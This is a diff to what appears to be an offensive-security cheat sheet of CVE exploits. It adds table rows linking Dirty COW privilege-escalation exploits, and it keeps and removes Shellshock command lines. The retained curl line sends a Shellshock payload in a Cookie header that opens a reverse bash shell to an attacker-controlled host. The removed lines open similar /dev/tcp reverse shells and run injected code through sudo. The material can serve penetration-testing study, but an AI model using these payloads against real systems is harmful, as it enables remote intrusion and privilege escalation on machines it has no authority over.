@@ -52,7 +52,8 @@
 | CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
 | CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
 | CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
-| CVE-2016-5195 | Dirty COW (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
+| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
+| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
 | CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
 | CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
 | CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
@@ -191,12 +192,6 @@ $ gcc <FILE>.c -static
 
 ```c
 $ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
-```
-
-```c
-$ shellshock='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
-$ <environment_variable>='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
-$ <environment_variable>='() { :;}; echo exploit' sudo /root/<binary>
 ```
 
 ## CVE-2016-1531: exim LPE
